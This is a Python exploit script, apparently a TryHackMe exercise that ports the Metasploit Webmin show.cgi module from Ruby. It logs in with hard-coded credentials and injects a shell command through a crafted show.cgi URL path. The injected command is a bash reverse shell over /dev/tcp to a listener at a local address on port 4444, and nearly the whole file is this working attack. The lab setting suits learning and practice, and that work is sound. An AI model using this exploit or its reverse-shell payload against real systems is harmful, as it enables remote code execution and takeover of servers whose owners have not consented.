"""
Webmin exploit .rb to .py rewrite

https://tryhackme.com/room/intropocscripting
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
"""

import random
import string
import requests

REMOTE_HOST = "10.10.159.74"
REMOTE_PORT = "80"

USERNAME = "user1"
PASSWORD = "1user"

LOCAL_HOST = "10.10.167.230"
LOCAL_PORT = "4444"

PAYLOAD = f"bash -c 'exec bash -i &>/dev/tcp/{LOCAL_HOST}/{LOCAL_PORT}<&1'"


def login(host, port, username, password):
    """
    Log in to the webmin host with a valid set of credentials.
    """
    url = f"http://{host}:{port}/session_login.cgi"
    data = {"page": "%2f", "user": username, "pass": password}
    cookies = {"testing": "1"}

    response = requests.post(url, data=data, cookies=cookies,
                             verify=False, allow_redirects=False,
                             timeout=10)

    if response.status_code == 302 and response.cookies["sid"] is not None:
        print("[+] Login successful.")
    else:
        print("[-] Login failed.")

    session = response.cookies["sid"]
    print(f"[/] Cookie session: {session}")
    return session


def generate_random_string(length):
    """
    Generate a string of random ascii letters and digits of the given length.
    """
    alpha_num = string.ascii_letters + string.digits
    return ''.join(random.choice(alpha_num) for _ in range(length))


def exploit(host, port, session, payload):
    """
    Send the exploit payload.
    """
    random_string = generate_random_string(10)
    url = f"http://{host}:{port}/file/show.cgi/bin/{random_string}|{payload}|"
    requests.post(url, cookies={"sid": session}, timeout=10)


def main():
    """
    Start the program.
    Log in with valid credentials and get the session cookie.
    Send the exploit.
    """
    session = login(REMOTE_HOST, REMOTE_PORT, USERNAME, PASSWORD)
    exploit(REMOTE_HOST, REMOTE_PORT, session, PAYLOAD)


if __name__ == "__main__":
    main()
